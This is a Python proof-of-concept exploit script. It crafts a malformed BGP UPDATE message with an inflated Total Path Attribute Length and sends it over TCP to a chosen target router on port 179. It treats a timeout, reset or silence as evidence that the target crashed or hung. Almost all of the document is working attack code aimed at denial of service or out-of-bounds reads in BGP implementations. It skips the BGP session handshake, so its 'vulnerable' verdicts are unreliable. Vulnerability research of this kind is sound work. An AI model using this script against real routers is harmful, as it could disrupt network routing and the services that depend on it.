#!/usr/bin/env python3
"""
Proof-of-Concept: BGP UPDATE Message Path Attribute Overflow

This script crafts a BGP UPDATE message where the 'Total Path Attribute Length'
field is set to a value significantly larger than the actual payload provided.
According to RFC 4271 Section 6.3, a compliant implementation must validate that
(Withdrawn Routes Length + Total Attribute Length + 23) <= Message Length.

Vulnerable implementations may attempt to read or allocate memory based on the
inflated length field, potentially causing a crash, information leak, or DoS.
"""

import socket
import struct
import sys
import time

# BGP Constants
BGP_PORT = 179
BGP_VERSION = 4
BGP_MARKER_SIZE = 16
BGP_HEADER_SIZE = 19  # 16 (marker) + 2 (length) + 1 (type)
BGP_MSG_TYPE_UPDATE = 1
BGP_MSG_TYPE_NOTIFICATION = 3

# Error Codes for Notification
NOTIFICATION_ERROR_CODE_UPDATE_MSG = 2
NOTIFICATION_SUBCODE_MALFORMED_ATTR_LIST = 1

def craft_bgp_header(msg_type, msg_length):
    """
    Crafts the fixed 19-octet BGP header.
    - Marker: 16 octets of 0xFF (standard for open sessions)
    - Length: 2 octets (total message length including header)
    - Type: 1 octet
    """
    marker = b'\xff' * BGP_MARKER_SIZE
    length = struct.pack('!H', msg_length)
    type_byte = struct.pack('!B', msg_type)
    return marker + length + type_byte

def craft_malicious_update_message(inflated_attr_length):
    """
    Crafts a BGP UPDATE message with an inflated Total Path Attribute Length.
    
    Structure:
    - Withdrawn Routes Length: 2 octets (set to 0)
    - Withdrawn Routes: 0 octets
    - Total Path Attribute Length: 2 octets (set to inflated_attr_length)
    - Path Attributes: <actual small payload>
    - NLRI: <empty or minimal>
    """
    # Withdrawn Routes Length (0)
    withdrawn_routes_length = struct.pack('!H', 0)
    
    # Total Path Attribute Length (Inflated)
    # This is the core of the vulnerability. We claim the attributes are huge,
    # but we only provide a tiny payload.
    total_attr_length = struct.pack('!H', inflated_attr_length)
    
    # Actual Path Attributes Payload
    # We provide a minimal valid-looking attribute to trigger parsing.
    # Attribute: ORIGIN (Type Code 1)
    # Flags: 0x40 (Well-known, Transitive, Non-Partial, Non-Extended)
    # Type Code: 0x01
    # Length: 0x01
    # Value: 0x00 (IGP)
    actual_attr_payload = b'\x40\x01\x01\x00'
    
    # NLRI (Network Layer Reachability Information)
    # Empty for this PoC
    nlri = b''
    
    # Combine variable part
    variable_part = withdrawn_routes_length + total_attr_length + actual_attr_payload + nlri
    
    # Calculate total message length
    total_msg_len = BGP_HEADER_SIZE + len(variable_part)
    
    # Craft header
    header = craft_bgp_header(BGP_MSG_TYPE_UPDATE, total_msg_len)
    
    return header + variable_part

def send_and_observe(target_ip, target_port, payload):
    """
    Sends the crafted payload to the target and observes the response.
    """
    print(f"[*] Sending malicious BGP UPDATE to {target_ip}:{target_port}")
    print(f"    - Inflated Total Path Attribute Length: {struct.unpack('!H', payload[21:23])[0]} octets")
    print(f"    - Actual Payload Size: {len(payload) - BGP_HEADER_SIZE - 4} octets")
    
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Connect to the BGP speaker
        sock.connect((target_ip, target_port))
        
        # Send the malicious message
        sock.sendall(payload)
        print("[+] Malicious message sent.")
        
        # Wait for response
        try:
            response = sock.recv(4096)
            if response:
                print("[+] Received response from target:")
                # Parse response if it's a Notification
                if len(response) >= BGP_HEADER_SIZE:
                    resp_type = struct.unpack('!B', response[18:19])[0]
                    if resp_type == BGP_MSG_TYPE_NOTIFICATION:
                        error_code = struct.unpack('!B', response[19:20])[0]
                        subcode = struct.unpack('!B', response[20:21])[0]
                        print(f"    - BGP Notification Received!")
                        print(f"    - Error Code: {error_code}")
                        print(f"    - Subcode: {subcode}")
                        
                        if error_code == NOTIFICATION_ERROR_CODE_UPDATE_MSG and \
                           subcode == NOTIFICATION_SUBCODE_MALFORMED_ATTR_LIST:
                            print("[!] Target correctly rejected the message (RFC 4271 Compliant).")
                            print("    Vulnerability likely PATCHED or not present.")
                        else:
                            print("[?] Target sent a Notification, but not the expected Malformed Attribute List.")
                    else:
                        print(f"    - Unexpected BGP Message Type: {resp_type}")
                else:
                    print(f"    - Raw Response: {response.hex()}")
            else:
                print("[-] No response received within timeout.")
                print("    This could indicate a crash, hang, or silent drop (Vulnerable).")
        except socket.timeout:
            print("[-] Connection timed out waiting for response.")
            print("    This could indicate the target crashed or hung processing the message (Vulnerable).")
        except ConnectionResetError:
            print("[-] Connection reset by peer.")
            print("    This could indicate the target crashed (Vulnerable).")
        
        sock.close()
        
    except Exception as e:
        print(f"[!] Error during network operation: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_bgp_update_path_attr_overflow.py <target_ip> [target_port]")
        print("Example: python poc_bgp_update_path_attr_overflow.py 192.168.1.100")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else BGP_PORT
    
    # Define the inflated length
    # RFC 4271 says max message size is 4096. We'll try a value that exceeds
    # the actual message size but might be within buffer allocation limits,
    # or significantly larger to trigger OOB read.
    inflated_length = 4000  # Claim 4KB of attributes
    
    print("="*60)
    print("BGP UPDATE Path Attribute Overflow PoC")
    print("="*60)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Vulnerability: Total Path Attribute Length > Actual Payload")
    print("="*60)
    
    # Craft the malicious message
    malicious_msg = craft_malicious_update_message(inflated_length)
    
    # Send and observe
    send_and_observe(target_ip, target_port, malicious_msg)
    
    print("\n[*] PoC Execution Complete.")
    print("    If the target crashed, hung, or sent an unexpected error, it is likely vulnerable.")
    print("    If it sent a 'Malformed Attribute List' notification, it is likely patched.")

if __name__ == "__main__":
    main()
